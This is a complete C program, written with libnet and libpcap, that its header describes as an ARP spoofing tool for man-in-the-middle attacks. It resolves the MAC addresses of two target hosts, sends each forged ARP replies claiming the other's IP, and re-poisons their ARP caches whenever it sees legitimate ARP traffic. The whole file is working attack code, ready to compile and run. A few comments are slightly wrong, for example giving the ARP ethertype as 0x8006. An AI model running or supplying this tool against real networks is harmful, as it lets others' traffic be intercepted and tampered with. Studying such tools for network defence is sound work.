/*
 * ARP Spoof is an application that uses ARP packets for establishing a
 * Man In The Middle (MITM) attack.
 *
 * Copyright (C) 2012  Antonin Beaujeant
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <libnet.h>

#include "structures.h"


/**********************/
/*  GLOBAL VARIABLES  */
/**********************/

/* Handle for the opened pcap session */
pcap_t *handle;

/* Libnet context */
libnet_t *l;

/* Used in the callbak function to know which IP to process */
u_int32_t ip_tmp, ip_tmp_two;

/* Libnet has already a structure for harware address */
struct libnet_ether_addr mac_tmp;


/****************/
/*  PROTOTYPES  */
/****************/

/* Callback function triggered whenever the user press Ctrl + C */
void ctrl_c ();

/* Function that describes how to use the program */
void usage (int, char **);

/* Function that initializes the Ethernet and ARP header */
static void arp_hdr_init (void);

/* Function used for resolving the MAC address from an IP address */
void get_mac (u_int32_t, struct libnet_ether_addr *);

/* Callback function to process a packet once captured */
void process_packet (u_char *, const struct pcap_pkthdr *, const u_char *);

/* Function for spoofing an IP with the device MAC address */
void spoof (u_int32_t, u_int32_t, struct libnet_ether_addr, struct libnet_ether_addr *);

/* Callback function that stops the sniff once legitimate packets found */
void spoof_back (u_char *, const struct pcap_pkthdr *, const u_char *);


/**********/
/*  MAIN  */
/**********/

int main (int argc, char *argv[]) {

	char *device = NULL;							/* Interface for the network access */
	char *filter = "arp";							/* Filter for BPF (human readable) */
	char errbuf[LIBNET_ERRBUF_SIZE];				/* Buffer for the error messages */
	int c, s;										/* Generic value for error handling */
	u_int32_t ip, ip_target_one, ip_target_two;		/* IP variables */
	struct bpf_program fp;							/* Compiled BPF filter */
	struct libnet_ether_addr *mac, mac_target_one, mac_target_two;
	

	/* Clear the error buffer */
	errbuf[0] = 0;

	/* Specifies to trigger the callback function ctrl_c whenever the user press CTRL+C */
	signal (SIGINT, ctrl_c);

	usage (argc, argv);

	if (argc > 4 && !strcmp(argv[3], "-i")) {
		device = argv[4];
	}


	/**********************************************/
	/*                                            */
	/*               Initialization               */
	/*                                            */
	/* This application uses the network (device) */
	/* interface for sending and receiving        */
	/* packets. It first need to initialize the   */
	/* device for both output (libnet) and input  */
	/* (pcap) communications.                     */
	/**********************************************/ 

	/* Initializing the session */
	if ((l = libnet_init (LIBNET_LINK, device, errbuf)) == NULL) {
		fprintf (stderr, "An error occurred while initializing the the session.\n%s", errbuf);
		exit (1);
	}           

	/* Converting target IPs in network byte ordered IPv4 */	
	if ((ip_target_one = libnet_name2addr4 (l, argv[1], LIBNET_RESOLVE)) == -1) {
		fprintf (stderr, "An error occurred while converting the IP: %s.\n%s", argv[1], libnet_geterror (l));
		exit (1);
	}

	if ((ip_target_two = libnet_name2addr4 (l, argv[2], LIBNET_RESOLVE)) == -1) {
		fprintf (stderr, "An error occurred while converting the IP: %s.\n%s", argv[2], libnet_geterror (l));
		exit (1);
	}

	/* Getting IP and MAC address of the interface */	
	if ((mac = libnet_get_hwaddr(l)) == NULL) {
		fprintf (stderr, "An error occurred while getting the MAC address of the iface.\n%s", libnet_geterror (l));
		exit (1);
	}

	if ((ip = libnet_get_ipaddr4(l)) == -1) {
		fprintf (stderr, "An error occurred while getting the IP address of the iface.\n%s", libnet_geterror (l));
		exit (1);
	}

	/* Getting the device we are using for libpcap */
	/* (I acutally should use libnet_getdevice() but I faced some issues because of non-const variable) */
	if (l == NULL) {
		device = NULL;
		fprintf (stderr, "Device is NULL.");
	} else {
		device = l->device;
	}

	/* Configuring the sniffing interface */
	if ((handle = pcap_open_live (device, 1500, 0, 2000, errbuf)) == NULL) {
		fprintf (stderr, "An error occurred while opening the device.\n%s", errbuf);
		exit (1);
	}

	if (strlen (errbuf) > 0) {
		fprintf (stderr, "Warning: %s", errbuf);
		errbuf[0] = 0;
	}

	if (pcap_datalink (handle) != DLT_EN10MB) {
		fprintf (stderr, "This program only supports Ethernet cards!\n");
		exit (1);
	}

	/* Compiling the filter for ARP packet only */
	if (pcap_compile (handle, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == -1) {
		fprintf (stderr, "%s", pcap_geterr (handle));
		exit (1);
	}

	/* Setting the filter for the sniffing session */
	if (pcap_setfilter (handle, &fp) == -1) {
		fprintf (stderr, "%s", pcap_geterr (handle));
		exit (1);
	}

	/* Free the BPF program */
	pcap_freecode (&fp);


	/******************************************/
	/*                                        */
	/*          Lookup targets' MAC           */
	/*                                        */
	/* Get MAC address by forging ARP packets */
	/* and waiting for answers.               */
	/******************************************/ 

	/* Get MAC for target one */
	ip_tmp = ip_target_one;
	get_mac (ip, mac);
	mac_target_one = mac_tmp;

	/* Get MAC for target two */
	ip_tmp = ip_target_two;
	get_mac (ip, mac);
	mac_target_two = mac_tmp;


	/******************************************/
	/*                                        */
	/*             SPOOOOOOFING               */
	/*                                        */
	/* Send a fake ARP REPLY telling to       */
	/* target one that I'm target two and     */
	/* vice versa. Once the spoof done, the   */
	/* app sniff for any legitimate ARP for   */
	/* spoofing again.                        */
	/******************************************/ 

	spoof (ip_target_one, ip_target_two, mac_target_one, mac);
	spoof (ip_target_two, ip_target_one, mac_target_two, mac);

	ip_tmp = ip_target_one;
	ip_tmp_two = ip_target_two;
	mac_tmp = *mac;

	while(1) {

		/* Sniffing device and process every ARP packet in spoof_back () */
		if ((s = pcap_loop (handle, -1, spoof_back, NULL)) < 0) {
			if (s == -1) {
				fprintf (stderr, "%s", pcap_geterr (handle));
				exit (1);
			}
		}

		spoof (ip_target_one, ip_target_two, mac_target_one, mac);
		spoof (ip_target_two, ip_target_one, mac_target_two, mac);

	}

	pcap_close (handle);

	/* Clear the libnet context */
	libnet_destroy (l);

	return 0;
}


/************/
/*  CTRL C  */
/************/

void ctrl_c () {
	printf ("\n\nExiting\n");

	pcap_breakloop (handle);  	/* tell pcap_loop to stop capturing */
	pcap_close (handle);
	libnet_destroy (l);			/* Clear the libnet context */
	
	exit (0);
}


/***********/
/*  USAGE  */
/***********/

void usage (int argc, char *argv[]) {

	if (argc < 3 || (argc > 1 && !strncmp(argv[1], "-h", 2))) {
		printf("Usage: %s <IP target 1> <IP target 2> [OPTIONS]\n\n", argv[0]);
		printf("[OPTIONS]:\n");
		printf("  -i interface : Select the interface\n");
		exit(0);
	}

}


/*************/
/*  GET MAC  */
/*************/

void get_mac (u_int32_t ip, struct libnet_ether_addr *mac) {

	libnet_ptag_t arp = 0, eth = 0;	/* Libnet protocol tag */
	u_int8_t broadcast_ether[6];	/* Ethernet broadcast address */
	int s;							/* Generic value for error handling */

	memset(broadcast_ether, 0xff, ETHER_ADDR_LEN);	/* MAC destination set to ff:ff:ff:ff:ff:ff */

	arp = libnet_autobuild_arp (	ARPOP_REQUEST,					/* OP: REQUEST */
									(u_int8_t *) mac,				/* MAC address of device used */
									(u_int8_t *) &ip,				/* IP address of device used */
									(u_int8_t *) broadcast_ether,	/* Set to Broadcast address */
									(u_int8_t *) &ip_tmp,			/* IP address of the target */
									l);								/* libnet context */


	if (arp == -1) {
		fprintf (stderr, "An error occurred while building the ARP header.\n%s\n", libnet_geterror (l));
		exit (1);
	}

	eth = libnet_build_ethernet (	(u_int8_t *) broadcast_ether,	/* Set to Bradcast address */
									(u_int8_t *) mac,				/* MAC address of device used */
									ETHERTYPE_ARP,			       	/* Ethertype ARP: 0x8006 */
									NULL,                			/* No payload */
									0,                    			/* No payload */
									l,                    			/* libnet context */
									0);                   			/* No libnet protocol tag */

	if (eth == -1) {
		fprintf (stderr, "An error occurred while building the Ethernet header.\n%s\n", libnet_geterror (l));
		exit (1);
	}

	/* Send the Ethernet packet with the ARP request embedded */
	if ((libnet_write (l)) == -1) {
		fprintf (stderr, "An error occurred while sending the packet.\n%s\n", libnet_geterror (l));
		exit (1);
	}

	printf ("Looking the for the MAC address of %s...\n", libnet_addr2name4 (ip_tmp, LIBNET_DONT_RESOLVE));

	/* Sniffing on the device and process every ARP packet in process_packet () */
	if ((s = pcap_loop (handle, -1, process_packet, NULL)) < 0) {
		if (s == -1) {
			fprintf (stderr, "%s", pcap_geterr (handle));
			exit (1);
		}
	}

	/* Clear the context for the next packets to send */
	libnet_clear_packet (l);
}


/********************/
/*  PROCESS PACKET  */
/********************/

void process_packet (u_char *user, const struct pcap_pkthdr *header, const u_char * packet) {

	/* PCAP use different struct than libnet for Ether and ARP packets */
	struct etherhdr *eth_header; 
	struct ether_arp *arp_packet;

	eth_header = (struct etherhdr *) packet;

	/* In memory, values are oriented in little-endian */
	/* ntohs () put it in a human readable way */
	if (ntohs (eth_header->ether_type) == ETHERTYPE_ARP) {

		arp_packet = (struct ether_arp *) (packet + (ETHER_ADDR_LEN+ETHER_ADDR_LEN+2));

		/* Check if the ARP packet is an ARP reply from one of the targets */
		if (ntohs (arp_packet->ea_hdr.ar_op) == 2 && !memcmp (&ip_tmp, arp_packet->arp_spa, 4)) {

			memcpy (mac_tmp.ether_addr_octet, eth_header->ether_shost, 6);

			printf ("Target: %d.%d.%d.%d is at: %02x:%02x:%02x:%02x:%02x:%02x\n", 	
					arp_packet->arp_spa[0],
					arp_packet->arp_spa[1],
					arp_packet->arp_spa[2],
					arp_packet->arp_spa[3],	

					mac_tmp.ether_addr_octet[0],
					mac_tmp.ether_addr_octet[1],
					mac_tmp.ether_addr_octet[2],
					mac_tmp.ether_addr_octet[3],
					mac_tmp.ether_addr_octet[4],
					mac_tmp.ether_addr_octet[5]);

			pcap_breakloop (handle);
		}
	}
}


/***********/
/*  SPOOF  */
/***********/

void spoof (u_int32_t ip_target, u_int32_t ip_spoof, struct libnet_ether_addr mac_target, struct libnet_ether_addr *mac) {

	libnet_ptag_t arp = 0, eth = 0;	/* Libnet protocol tag */
	int s;							/* Generic value for error handling */

	arp = libnet_autobuild_arp (	ARPOP_REPLY,				/* OP: REPLY */
									(u_int8_t *) mac,			/* MAC address of device used */
									(u_int8_t *) &ip_spoof,		/* IP to spoof */
									(u_int8_t *) &mac_target,	/* MAC of the target */
									(u_int8_t *) &ip_target,	/* IP address of the target */
									l);							/* libnet context */


	if (arp == -1) {
		fprintf (stderr, "An error occurred while building the ARP header: %s\n", libnet_geterror (l));
		exit (1);
	}

	eth = libnet_build_ethernet (	(u_int8_t *) &mac_target,	/* MAC address of the target */
									(u_int8_t *) mac,			/* MAC address of device used */
									ETHERTYPE_ARP,				/* Ethertype ARP: 0x8006 */
									NULL,						/* No payload */
									0,							/* No payload */
									l,							/* libnet context */
									0);							/* No libnet protocol tag */

	if (eth == -1) {
		fprintf (stderr, "An error occurred while building the Ethernet header.\n%s\n", libnet_geterror (l));
		exit (1);
	}

	printf ("Spoofing %s to %s\n", libnet_addr2name4 (ip_spoof, LIBNET_DONT_RESOLVE), libnet_addr2name4 (ip_target, LIBNET_DONT_RESOLVE));

	/* Send the Ethernet packet with the ARP request embedded */
	if ((libnet_write (l)) == -1) {
		fprintf (stderr, "An error occurred while sending the packet.\n%s\n", libnet_geterror (l));
		exit (1);
	}

	/* Clear the context for a new packet to send */
	libnet_clear_packet (l);
}


/****************/
/*  SPOOF BACK  */
/****************/

void spoof_back (u_char *user, const struct pcap_pkthdr *header, const u_char * packet) {

	/* PCAP use different struct than libnet for Ether and  ARP packets */
	struct etherhdr *eth_header;
	struct ether_arp *arp_packet;

	eth_header = (struct etherhdr *) packet;

	/* In memory, values are oriented in little-endian */
	/* ntohs () put it in a human readable way */
	if (ntohs (eth_header->ether_type) == ETHERTYPE_ARP) {

		arp_packet = (struct ether_arp *) (packet + (ETHER_ADDR_LEN+ETHER_ADDR_LEN+2));

		/* If one the targets sent a legitimate ARP reply, the app stop the sniff */
		if (	ntohs (arp_packet->ea_hdr.ar_op) == 2 && 
				memcmp (mac_tmp.ether_addr_octet, eth_header->ether_shost, 6) &&
				(!memcmp (&ip_tmp, arp_packet->arp_spa, 4) || !memcmp (&ip_tmp_two, arp_packet->arp_spa, 4))) {

			printf ("Target: %d.%d.%d.%d sent legitimate ARP packet. Spoof back...\n", 	
					arp_packet->arp_spa[0],
					arp_packet->arp_spa[1],
					arp_packet->arp_spa[2],
					arp_packet->arp_spa[3]);

			pcap_breakloop (handle);
		}

		/* If one the targets ask who is the other target, the app stop the sniff */
		if (	ntohs (arp_packet->ea_hdr.ar_op) == 1 && 
			memcmp (mac_tmp.ether_addr_octet, eth_header->ether_shost, 6) &&
			(!memcmp (&ip_tmp, arp_packet->arp_tpa, 4) || !memcmp (&ip_tmp_two, arp_packet->arp_tpa, 4))) {

			printf ("Someone is asking for the MAC of one of the targets... Spoof back!\n", 	
					arp_packet->arp_spa[0],
					arp_packet->arp_spa[1],
					arp_packet->arp_spa[2],
					arp_packet->arp_spa[3]);

			pcap_breakloop (handle);
		}

	}
}
